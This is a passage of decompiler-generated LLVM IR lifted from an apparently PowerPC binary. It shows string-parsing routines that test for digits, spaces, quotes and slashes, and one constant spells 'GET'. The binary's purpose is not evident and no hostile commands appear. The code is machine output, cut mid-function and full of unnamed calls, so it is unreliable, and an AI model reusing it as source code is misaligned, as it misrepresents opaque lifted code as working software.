  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10001568 = load i32, i32* @r30, align 4
  %v2_10001568 = add i32 %v1_10001568, -533
  %v3_10001568 = inttoptr i32 %v2_10001568 to i32*
  store i32 -1, i32* %v3_10001568, align 4
  %v0_1000156c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000156c = trunc i32 %v0_1000156c to i8
  %v2_1000156c = load i32, i32* @r30, align 4
  %v3_1000156c = add i32 %v2_1000156c, -529
  %v4_1000156c = inttoptr i32 %v3_1000156c to i8*
  store i8 %v1_1000156c, i8* %v4_1000156c, align 1
  br label %dec_label_pc_10000824

dec_label_pc_10001574:                            ; preds = %dec_label_pc_10001140, %dec_label_pc_1000111c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268440960, i32* %lr.global-to-local, align 4
  %v3_1000157c = call i32 @function_10006bb0(i32 37, i32* null)
  %v0_10001580 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001580, i32* %r4.global-to-local, align 4
  %v0_10001588 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001588, i32* %r3.global-to-local, align 4
  store i32 268440976, i32* %lr.global-to-local, align 4
  %v3_1000158c = inttoptr i32 %v0_10001588 to i8*
  %v4_1000158c = call i32 @function_1000788c(i8* %v3_1000158c, i32 %v0_10001580, i32 %v3_1000157c)
  store i32 %v4_1000158c, i32* %r3.global-to-local, align 4
  %v1_10001590 = icmp slt i32 %v4_1000158c, -1
  %v2_10001590 = icmp sgt i32 %v4_1000158c, -1
  %v3_10001590 = icmp eq i32 %v4_1000158c, -1
  store i1 %v1_10001590, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001590, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001590, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001590, label %dec_label_pc_1000177c, label %dec_label_pc_10001598

dec_label_pc_10001598:                            ; preds = %dec_label_pc_10001574
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268440996, i32* %lr.global-to-local, align 4
  %v3_100015a0 = call i32 @function_10006bb0(i32 37, i32* null)
  %v0_100015a4 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100015a4, i32* %r4.global-to-local, align 4
  %v0_100015ac = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_100015ac, i32* %r3.global-to-local, align 4
  store i32 268441012, i32* %lr.global-to-local, align 4
  %v3_100015b0 = inttoptr i32 %v0_100015ac to i8*
  %v4_100015b0 = call i32 @function_1000788c(i8* %v3_100015b0, i32 %v0_100015a4, i32 %v3_100015a0)
  store i32 %v4_100015b0, i32* %r3.global-to-local, align 4
  %v0_100015b8 = load i32, i32* %r18.global-to-local, align 4
  %v2_100015b8 = add i32 %v0_100015b8, %v4_100015b0
  store i32 %v2_100015b8, i32* %r9.global-to-local, align 4
  %v1_100015bc = add i32 %v2_100015b8, 10532
  %v2_100015bc = inttoptr i32 %v1_100015bc to i8*
  %v3_100015bc = load i8, i8* %v2_100015bc, align 1
  %v4_100015bc = zext i8 %v3_100015bc to i32
  store i32 %v4_100015bc, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_100015c8 = xor i32 %v4_100015bc, 32
  %v1_100015cc = sub nsw i32 0, %v1_100015c8
  %v2_100015cc = xor i32 %v4_100015bc, -33
  %v4_100015cc = icmp uge i32 %v2_100015cc, %v1_100015cc
  %v2_100015d0 = zext i1 %v4_100015cc to i32
  %v3_100015d0 = add i32 %v2_100015d0, %v4_100015b0
  store i32 %v3_100015d0, i32* %r11.global-to-local, align 4
  %v0_100015d4 = load i32, i32* %r20.global-to-local, align 4
  %v2_100015d4 = add i32 %v3_100015d0, %v0_100015d4
  store i32 %v2_100015d4, i32* @r28, align 4
  store i32 %v2_100015d4, i32* %r3.global-to-local, align 4
  %v1_100015dc = load i32, i32* %r24.global-to-local, align 4
  %v2_100015dc = sub i32 %v1_100015dc, %v3_100015d0
  store i32 %v2_100015dc, i32* %r4.global-to-local, align 4
  store i32 %v3_100015d0, i32* %r31.global-to-local, align 4
  store i32 268441064, i32* %lr.global-to-local, align 4
  %v5_100015e4 = call i32 @function_100075a8(i32 %v2_100015d4, i32 %v2_100015dc, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_100015e4, i32* %r3.global-to-local, align 4
  %v1_100015e8 = icmp slt i32 %v5_100015e4, -1
  %v2_100015e8 = icmp sgt i32 %v5_100015e4, -1
  %v3_100015e8 = icmp eq i32 %v5_100015e4, -1
  store i1 %v1_100015e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100015e8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100015e8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_100015e4, i32* %r27.global-to-local, align 4
  br i1 %v3_100015e8, label %dec_label_pc_1000177c, label %dec_label_pc_100015f4

dec_label_pc_100015f4:                            ; preds = %dec_label_pc_10001598
  %v1_100015f4 = icmp slt i32 %v5_100015e4, 1
  %v2_100015f4 = icmp sgt i32 %v5_100015e4, 1
  %v3_100015f4 = icmp eq i32 %v5_100015e4, 1
  store i1 %v1_100015f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100015f4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100015f4, i1* %cr7_eq.global-to-local, align 1
  %tmp82 = icmp slt i32 %v5_100015e4, 2
  br i1 %tmp82, label %dec_label_pc_10001600, label %dec_label_pc_100015fc

dec_label_pc_100015fc:                            ; preds = %dec_label_pc_100015f4
  %v1_100015fc = add i32 %v5_100015e4, -2
  store i32 %v1_100015fc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10001600

dec_label_pc_10001600:                            ; preds = %dec_label_pc_100015f4, %dec_label_pc_100015fc
  %v1_10001608 = phi i32 [ %v5_100015e4, %dec_label_pc_100015f4 ], [ %v1_100015fc, %dec_label_pc_100015fc ]
  %v0_10001600 = load i32, i32* %r18.global-to-local, align 4
  %v1_10001600 = load i32, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10001600 = add i32 %v0_10001600, %v1_10001608
  %v2_10001608 = add i32 %v2_10001600, %v1_10001600
  store i32 %v2_10001608, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v3_10001610 = add i32 %v2_10001608, 10532
  %v4_10001610 = inttoptr i32 %v3_10001610 to i8*
  store i8 0, i8* %v4_10001610, align 1
  %v0_10001614 = load i32, i32* @r28, align 4
  store i32 %v0_10001614, i32* %r4.global-to-local, align 4
  %v0_10001618 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001618 = load i32, i32* @r1, align 4
  %v2_10001618 = add i32 %v1_10001618, 8
  %v3_10001618 = inttoptr i32 %v2_10001618 to i32*
  store i32 %v0_10001618, i32* %v3_10001618, align 4
  %v0_1000161c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000161c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000161c = add i32 %v1_1000161c, %v0_1000161c
  %v3_1000161c = inttoptr i32 %v2_1000161c to i8*
  %v4_1000161c = load i8, i8* %v3_1000161c, align 1
  %v5_1000161c = zext i8 %v4_1000161c to i32
  store i32 %v5_1000161c, i32* %r3.global-to-local, align 4
  %v1_10001620 = add nuw nsw i32 %v5_1000161c, 208
  %v1_10001624 = urem i32 %v1_10001620, 256
  store i32 %v1_10001624, i32* %r0.global-to-local, align 4
  %v1_10001628 = icmp ult i32 %v1_10001624, 9
  %v2_10001628 = icmp ugt i32 %v1_10001624, 9
  %v3_10001628 = icmp eq i32 %v1_10001624, 9
  store i1 %v1_10001628, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001628, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001628, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001628, label %dec_label_pc_10001658, label %dec_label_pc_10001630

dec_label_pc_10001630:                            ; preds = %dec_label_pc_10001600
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001634

dec_label_pc_10001634:                            ; preds = %dec_label_pc_10001634, %dec_label_pc_10001630
  %v0_10001634 = phi i32 [ %v0_1000163c, %dec_label_pc_10001634 ], [ 0, %dec_label_pc_10001630 ]
  %v1_10001634 = add i32 %v0_10001634, 1
  store i32 %v1_10001634, i32* %r11.global-to-local, align 4
  %v1_10001638 = load i32, i32* @r1, align 4
  %v2_10001638 = add i32 %v1_10001638, 8
  %v3_10001638 = inttoptr i32 %v2_10001638 to i32*
  store i32 %v1_10001634, i32* %v3_10001638, align 4
  %v0_1000163c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000163c, i32* %r9.global-to-local, align 4
  %v1_10001640 = load i32, i32* @r28, align 4
  %v2_10001640 = add i32 %v1_10001640, %v0_1000163c
  %v3_10001640 = inttoptr i32 %v2_10001640 to i8*
  %v4_10001640 = load i8, i8* %v3_10001640, align 1
  %v5_10001640 = zext i8 %v4_10001640 to i32
  store i32 %v5_10001640, i32* %r3.global-to-local, align 4
  %v1_10001644 = add nuw nsw i32 %v5_10001640, 208
  %v1_10001648 = urem i32 %v1_10001644, 256
  store i32 %v1_10001648, i32* %r0.global-to-local, align 4
  %v1_1000164c = icmp ult i32 %v1_10001648, 9
  %v2_1000164c = icmp ugt i32 %v1_10001648, 9
  %v3_1000164c = icmp eq i32 %v1_10001648, 9
  store i1 %v1_1000164c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000164c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000164c, i1* %cr7_eq.global-to-local, align 1
  %tmp83 = icmp ult i32 %v1_10001648, 10
  br i1 %tmp83, label %dec_label_pc_10001634, label %dec_label_pc_10001654

dec_label_pc_10001654:                            ; preds = %dec_label_pc_10001634
  store i32 %v2_10001640, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001658

dec_label_pc_10001658:                            ; preds = %dec_label_pc_10001600, %dec_label_pc_10001654
  %v0_10001658 = phi i32 [ %v5_1000161c, %dec_label_pc_10001600 ], [ %v5_10001640, %dec_label_pc_10001654 ]
  %v2_10001658 = icmp ne i32 %v0_10001658, 0
  %v3_10001658 = icmp eq i32 %v0_10001658, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001658, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001658, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001658, label %dec_label_pc_1000177c, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001658
  store i32 0, i32* %r26.global-to-local, align 4
  %v2_10001664 = load i32, i32* %r4.global-to-local, align 4
  %v3_10001664 = inttoptr i32 %v2_10001664 to i8*
  store i8 0, i8* %v3_10001664, align 1
  %v0_10001668 = load i32, i32* @r1, align 4
  %v1_10001668 = add i32 %v0_10001668, 8
  %v2_10001668 = inttoptr i32 %v1_10001668 to i32*
  %v3_10001668 = load i32, i32* %v2_10001668, align 4
  %v1_1000166c = add i32 %v3_10001668, 1
  store i32 %v1_1000166c, i32* %r11.global-to-local, align 4
  store i32 %v1_1000166c, i32* %v2_10001668, align 4
  %v0_10001674 = load i32, i32* @r28, align 4
  %v1_10001674 = load i32, i32* %r11.global-to-local, align 4
  %v2_10001674 = add i32 %v1_10001674, %v0_10001674
  %v3_10001674 = inttoptr i32 %v2_10001674 to i8*
  %v4_10001674 = load i8, i8* %v3_10001674, align 1
  %v5_10001674 = zext i8 %v4_10001674 to i32
  store i32 %v5_10001674, i32* %r0.global-to-local, align 4
  %v1_10001678 = icmp ult i8 %v4_10001674, 32
  %v2_10001678 = icmp ugt i8 %v4_10001674, 32
  %v3_10001678 = icmp eq i8 %v4_10001674, 32
  store i1 %v1_10001678, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001678, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001678, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001678, label %dec_label_pc_10001b84, label %dec_label_pc_10001680

dec_label_pc_10001680:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_10001b84
  %v1_10001680 = phi i32 [ %v1_10001674, %dec_label_pc_10001660 ], [ %v1_10001680.pre, %dec_label_pc_10001b84 ]
  %v0_10001680 = phi i32 [ %v0_10001674, %dec_label_pc_10001660 ], [ %v0_10001680.pre, %dec_label_pc_10001b84 ]
  %v2_10001680 = add i32 %v0_10001680, %v1_10001680
  store i32 %v2_10001680, i32* %r29.global-to-local, align 4
  store i32 %v2_10001680, i32* %r3.global-to-local, align 4
  store i32 268441228, i32* @lr, align 4
  %v1_10001688 = inttoptr i32 %v2_10001680 to i8*
  %v2_10001688 = call i32 @function_100074dc(i8* %v1_10001688)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000a7e4.43 to i32), i32* %r31.global-to-local, align 4
  store i32 %v2_10001688, i32* %r4.global-to-local, align 4
  %v0_1000169c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000169c, i32* %r3.global-to-local, align 4
  store i32 268441252, i32* %lr.global-to-local, align 4
  %v4_100016a0 = inttoptr i32 %v0_1000169c to i8*
  %v5_100016a0 = call i32 @function_1000788c(i8* %v4_100016a0, i32 %v2_10001688, i32 ptrtoint ([5 x i8]* @global_var_1000a7e4.43 to i32))
  store i32 %v5_100016a0, i32* %r3.global-to-local, align 4
  %v1_100016a4 = icmp slt i32 %v5_100016a0, -1
  %v2_100016a4 = icmp sgt i32 %v5_100016a0, -1
  %v3_100016a4 = icmp eq i32 %v5_100016a0, -1
  store i1 %v1_100016a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016a4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016a4, i1* %cr7_eq.global-to-local, align 1
  %v0_100019cc = load i32, i32* @r1, align 4
  %v1_100019cc = add i32 %v0_100019cc, 8
  %v2_100019cc = inttoptr i32 %v1_100019cc to i32*
  %v3_100019cc = load i32, i32* %v2_100019cc, align 4
  br i1 %v3_100016a4, label %dec_label_pc_100019cc, label %dec_label_pc_100016ac

dec_label_pc_100016ac:                            ; preds = %dec_label_pc_10001680
  %v0_100016b0 = load i32, i32* @r28, align 4
  %v2_100016b0 = add i32 %v0_100016b0, %v3_100019cc
  store i32 %v2_100016b0, i32* %r29.global-to-local, align 4
  store i32 %v2_100016b0, i32* %r3.global-to-local, align 4
  store i32 268441276, i32* @lr, align 4
  %v1_100016b8 = inttoptr i32 %v2_100016b0 to i8*
  %v2_100016b8 = call i32 @function_100074dc(i8* %v1_100016b8)
  %v0_100016bc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v2_100016b8, i32* %r4.global-to-local, align 4
  %v0_100016c4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100016c4, i32* %r3.global-to-local, align 4
  store i32 268441292, i32* %lr.global-to-local, align 4
  %v4_100016c8 = inttoptr i32 %v0_100016c4 to i8*
  %v5_100016c8 = call i32 @function_1000788c(i8* %v4_100016c8, i32 %v2_100016b8, i32 %v0_100016bc)
  store i32 %v5_100016c8, i32* %r3.global-to-local, align 4
  %v0_100016cc = load i32, i32* @r1, align 4
  %v1_100016cc = add i32 %v0_100016cc, 8
  %v2_100016cc = inttoptr i32 %v1_100016cc to i32*
  %v3_100016cc = load i32, i32* %v2_100016cc, align 4
  %v2_100016d0 = add i32 %v3_100016cc, %v5_100016c8
  store i32 %v2_100016d0, i32* %r11.global-to-local, align 4
  store i32 %v2_100016d0, i32* %v2_100016cc, align 4
  %v0_100016d8 = load i32, i32* @r28, align 4
  %v1_100016d8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100016d8 = add i32 %v1_100016d8, %v0_100016d8
  %v3_100016d8 = inttoptr i32 %v2_100016d8 to i8*
  %v4_100016d8 = load i8, i8* %v3_100016d8, align 1
  %v5_100016d8 = zext i8 %v4_100016d8 to i32
  store i32 %v5_100016d8, i32* %r0.global-to-local, align 4
  %v1_100016dc = icmp ult i8 %v4_100016d8, 34
  %v2_100016dc = icmp ugt i8 %v4_100016d8, 34
  %v3_100016dc = icmp eq i8 %v4_100016d8, 34
  store i1 %v1_100016dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100016dc, label %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge, label %dec_label_pc_100016e4

dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge: ; preds = %dec_label_pc_100016ac
  %v1_100019e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_100019dc

dec_label_pc_100016e4:                            ; preds = %dec_label_pc_100019cc, %dec_label_pc_100019dc, %dec_label_pc_100016ac, %dec_label_pc_10001a00
  %v0_100016e4 = load i32, i32* @r28, align 4
  store i32 %v0_100016e4, i32* @r3, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268441328, i32* @lr, align 4
  %v2_100016ec = call i32 @function_10007604(i32 %v0_100016e4, i32 10)
  store i32 %v2_100016ec, i32* %r3.global-to-local, align 4
  %v1_100016f0 = add i32 %v2_100016ec, -1
  store i32 %v1_100016f0, i32* %r0.global-to-local, align 4
  %v1_100016f4 = icmp ult i32 %v1_100016f0, 8
  %v2_100016f4 = icmp ugt i32 %v1_100016f0, 8
  %v3_100016f4 = icmp eq i32 %v1_100016f0, 8
  store i1 %v1_100016f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100016f4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100016f4, i1* %cr7_eq.global-to-local, align 1
  %v0_100016f8 = load i32, i32* @r1, align 4
  %v1_100016f8 = add i32 %v0_100016f8, 20792
  %v2_100016f8 = inttoptr i32 %v1_100016f8 to i32*
  %v3_100016f8 = load i32, i32* %v2_100016f8, align 4
  store i32 %v3_100016f8, i32* %r0.global-to-local, align 4
  %v2_100016fc = add i32 %v3_100016f8, %v2_100016ec
  store i32 %v2_100016fc, i32* @r31, align 4
  %tmp84 = icmp ult i32 %v1_100016f0, 9
  br i1 %tmp84, label %dec_label_pc_10001710.preheader, label %dec_label_pc_10001720

dec_label_pc_10001710.preheader:                  ; preds = %dec_label_pc_100016e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268441368, i32* @lr, align 4
  %v0_100017144 = call i32 @function_10008138()
  store i32 %v0_100017144, i32* %r3.global-to-local, align 4
  %v1_100017185 = load i32, i32* @r31, align 4
  %v2_100017186 = icmp ult i32 %v0_100017144, %v1_100017185
  %v3_100017187 = icmp ugt i32 %v0_100017144, %v1_100017185
  %v4_100017188 = icmp eq i32 %v0_100017144, %v1_100017185
  store i1 %v2_100017186, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100017187, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_100017188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100017186, label %dec_label_pc_10001708, label %dec_label_pc_10001720.loopexit

dec_label_pc_10001708:                            ; preds = %dec_label_pc_10001710.preheader, %dec_label_pc_10001708
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001710.44 to i32), i32* @lr, align 4
  %v1_1000170c = call i32 @function_1000965c(i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268441368, i32* @lr, align 4
  %v0_10001714 = call i32 @function_10008138()
  store i32 %v0_10001714, i32* %r3.global-to-local, align 4
  %v1_10001718 = load i32, i32* @r31, align 4
  %v2_10001718 = icmp ult i32 %v0_10001714, %v1_10001718
  %v3_10001718 = icmp ugt i32 %v0_10001714, %v1_10001718
  %v4_10001718 = icmp eq i32 %v0_10001714, %v1_10001718
  store i1 %v2_10001718, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001718, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001718, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001718, label %dec_label_pc_10001708, label %dec_label_pc_10001720.loopexit

dec_label_pc_10001720.loopexit:                   ; preds = %dec_label_pc_10001708, %dec_label_pc_10001710.preheader
  %v0_10001720.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10001720

dec_label_pc_10001720:                            ; preds = %dec_label_pc_10001720.loopexit, %dec_label_pc_100016e4
  %v0_10001720 = phi i32 [ %v0_10001720.pre, %dec_label_pc_10001720.loopexit ], [ %v0_100016f8, %dec_label_pc_100016e4 ]
  %v1_10001720 = add i32 %v0_10001720, 8
  %v2_10001720 = inttoptr i32 %v1_10001720 to i32*
  %v3_10001720 = load i32, i32* %v2_10001720, align 4
  store i32 %v3_10001720, i32* %r29.global-to-local, align 4
  %v0_10001724 = load i32, i32* @r28, align 4
  %v2_10001724 = add i32 %v0_10001724, %v3_10001720
  store i32 %v2_10001724, i32* @r31, align 4
  store i32 %v2_10001724, i32* %r3.global-to-local, align 4
  store i32 268441392, i32* @lr, align 4
  %v1_1000172c = inttoptr i32 %v2_10001724 to i8*
  %v2_1000172c = call i32 @function_100074dc(i8* %v1_1000172c)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_1000172c, i32* %r4.global-to-local, align 4
  %v0_1000173c = load i32, i32* @r31, align 4
  store i32 %v0_1000173c, i32* %r3.global-to-local, align 4
  store i32 268441412, i32* %lr.global-to-local, align 4
  %v4_10001740 = inttoptr i32 %v0_1000173c to i8*
  %v5_10001740 = call i32 @function_1000788c(i8* %v4_10001740, i32 %v2_1000172c, i32 ptrtoint ([5 x i8]* @global_var_1000a7dc.40 to i32))
  store i32 %v5_10001740, i32* %r3.global-to-local, align 4
  %v1_10001744 = icmp slt i32 %v5_10001740, 4
  %v2_10001744 = icmp sgt i32 %v5_10001740, 4
  %v3_10001744 = icmp eq i32 %v5_10001740, 4
  store i1 %v1_10001744, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001744, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001744, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001744, label %dec_label_pc_10001af0, label %dec_label_pc_1000174c

dec_label_pc_1000174c:                            ; preds = %dec_label_pc_10001720
  %v0_1000174c = load i32, i32* @r28, align 4
  %v1_1000174c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000174c = add i32 %v1_1000174c, %v0_1000174c
  %v3_1000174c = inttoptr i32 %v2_1000174c to i8*
  %v4_1000174c = load i8, i8* %v3_1000174c, align 1
  %v5_1000174c = zext i8 %v4_1000174c to i32
  store i32 %v5_1000174c, i32* %r0.global-to-local, align 4
  %v1_10001750 = icmp ult i8 %v4_1000174c, 47
  %v2_10001750 = icmp ugt i8 %v4_1000174c, 47
  %v3_10001750 = icmp eq i8 %v4_1000174c, 47
  store i1 %v1_10001750, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001750, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001750, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001750, label %dec_label_pc_10001a9c, label %dec_label_pc_10001758

dec_label_pc_10001758:                            ; preds = %dec_label_pc_10001ab4, %dec_label_pc_10001a9c, %dec_label_pc_1000174c, %dec_label_pc_10001ad8
  store i32 10, i32* %r9.global-to-local, align 4
  store i32 1195725824, i32* %r0.global-to-local, align 4
  %v2_10001764 = load i32, i32* @r30, align 4
  %v3_10001764 = add i32 %v2_10001764, -529
  %v4_10001764 = inttoptr i32 %v3_10001764 to i8*
  store i8 10, i8* %v4_10001764, align 1
  %v0_10001768 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001768 = load i32, i32* @r30, align 4
  %v2_10001768 = add i32 %v1_10001768, 898
  %v3_10001768 = inttoptr i32 %v2_10001768 to i32*
  store i32 %v0_10001768, i32* %v3_10001768, align 4
  br label %dec_label_pc_10000824

dec_label_pc_10001770:                            ; preds = %dec_label_pc_10000f14
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_10001774 = load i32, i32* @r30, align 4
  %v2_10001774 = add i32 %v1_10001774, 931
  %v3_10001774 = inttoptr i32 %v2_10001774 to i32*
  store i32 0, i32* %v3_10001774, align 4
  br label %dec_label_pc_10000fbc

dec_label_pc_1000177c:                            ; preds = %dec_label_pc_10001658, %dec_label_pc_10001598, %dec_label_pc_10001574
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001780 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001780, i32* %r4.global-to-local, align 4
  %v0_1000178c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_1000178c, i32* %r3.global-to-local, align 4
  %v0_10001790 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001790 = add i32 %v0_10001790, 1431
  store i32 %v1_10001790, i32* @r31, align 4
  store i32 268441496, i32* %lr.global-to-local, align 4
  %v5_10001794 = call i32 @function_100075a8(i32 %v0_1000178c, i32 %v0_10001780, i32 ptrtoint ([5 x i8]* @global_var_1000a7d0.37 to i32), i32 4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v5_10001794, i32* %r29.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000a7ec.45 to i32), i32* %r4.global-to-local, align 4
  %v0_100017a4 = load i32, i32* @r31, align 4
  store i32 %v0_100017a4, i32* %r3.global-to-local, align 4
  store i32 268441516, i32* %lr.global-to-local, align 4
  %v3_100017a8 = inttoptr i32 %v0_100017a4 to i8*
  %v4_100017a8 = call i32 @function_10007938(i8* %v3_100017a8, i32 ptrtoint ([5 x i8]* @global_var_1000a7ec.45 to i32))
  store i32 %v4_100017a8, i32* %r3.global-to-local, align 4
  %v1_100017ac = icmp slt i32 %v4_100017a8, 0
  %v2_100017ac = icmp sgt i32 %v4_100017a8, 0
  %v3_100017ac = icmp eq i32 %v4_100017a8, 0
  store i1 %v1_100017ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017ac, label %dec_label_pc_1000191c, label %dec_label_pc_100017b4

dec_label_pc_100017b4:                            ; preds = %dec_label_pc_1000191c, %dec_label_pc_1000177c
  store i32 7, i32* %r0.global-to-local, align 4
  %v2_100017b8 = load i32, i32* @r30, align 4
  %v3_100017b8 = add i32 %v2_100017b8, -529
  %v4_100017b8 = inttoptr i32 %v3_100017b8 to i8*
  store i8 7, i8* %v4_100017b8, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_100017bc:                            ; preds = %dec_label_pc_10001b78, %dec_label_pc_1000193c, %dec_label_pc_100017b4
  %v0_100017bc = load i32, i32* @r30, align 4
  %v1_100017bc = add i32 %v0_100017bc, -533
  %v2_100017bc = inttoptr i32 %v1_100017bc to i32*
  %v3_100017bc = load i32, i32* %v2_100017bc, align 4
  store i32 %v3_100017bc, i32* %r3.global-to-local, align 4
  %v0_100017c0 = load i32, i32* %r29.global-to-local, align 4
  %v0_100017c4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_100017c4, i32* %r4.global-to-local, align 4
  store i32 268441552, i32* @lr, align 4
  %v4_100017cc = call i32 @function_10008a08(i32 %v3_100017bc, i32 %v0_100017c4, i32 %v0_100017c0, i32 16384)
  store i32 %v4_100017cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000824

dec_label_pc_100017d4:                            ; preds = %dec_label_pc_10000cd0
  %v1_100017d4 = icmp slt i32 %v0_100017d4, 10239
  %v2_100017d4 = icmp sgt i32 %v0_100017d4, 10239
  %v3_100017d4 = icmp eq i32 %v0_100017d4, 10239
  store i1 %v1_100017d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017d4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017d4, i1* %cr7_eq.global-to-local, align 1
  %tmp85 = icmp slt i32 %v0_100017d4, 10240
  br i1 %tmp85, label %dec_label_pc_10000824, label %dec_label_pc_10000cf4

dec_label_pc_100017e0:                            ; preds = %dec_label_pc_10001524
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_100017e4 = load i32, i32* @r31, align 4
  %v2_100017e4 = inttoptr i32 %v1_100017e4 to i32*
  store i32 104, i32* %v2_100017e4, align 4
  br label %dec_label_pc_10001558

dec_label_pc_100017ec:                            ; preds = %dec_label_pc_100012f0
  %v0_100017ec = load i32, i32* %r25.global-to-local, align 4
  %v1_100017ec = inttoptr i32 %v0_100017ec to i32*
  %v2_100017ec = load i32, i32* %v1_100017ec, align 4
  store i32 %v2_100017ec, i32* %r0.global-to-local, align 4
  %v1_100017f0 = icmp slt i32 %v2_100017ec, 11
  %v2_100017f0 = icmp sgt i32 %v2_100017ec, 11
  %v3_100017f0 = icmp eq i32 %v2_100017ec, 11
  store i1 %v1_100017f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017f0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017f0, label %dec_label_pc_10000824, label %dec_label_pc_10001414

dec_label_pc_100017fc:                            ; preds = %dec_label_pc_100011a4
  store i32 7, i32* %r11.global-to-local, align 4
  %v1_10001800 = load i32, i32* @r1, align 4
  %v2_10001800 = add i32 %v1_10001800, 8
  %v3_10001800 = inttoptr i32 %v2_10001800 to i32*
  store i32 7, i32* %v3_10001800, align 4
  %v0_10001804 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001804 = add i32 %v0_10001804, 4
  %v2_10001804 = inttoptr i32 %v1_10001804 to i8*
